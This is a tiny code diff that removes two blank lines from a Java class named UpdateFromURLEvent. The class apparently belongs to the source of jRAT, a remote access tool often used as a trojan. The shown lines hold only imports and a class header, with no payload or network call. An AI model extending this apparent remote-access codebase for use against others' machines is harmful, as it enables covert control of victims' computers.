@@ -8,8 +8,6 @@ import pro.jrat.packets.outgoing.Packet18Update;
 import pro.jrat.utils.IconUtils;
 import pro.jrat.utils.Utils;
 
-
-
 public class UpdateFromURLEvent extends Event {
 
 	public ImageIcon icon = IconUtils.getIcon(getIcon(), true);
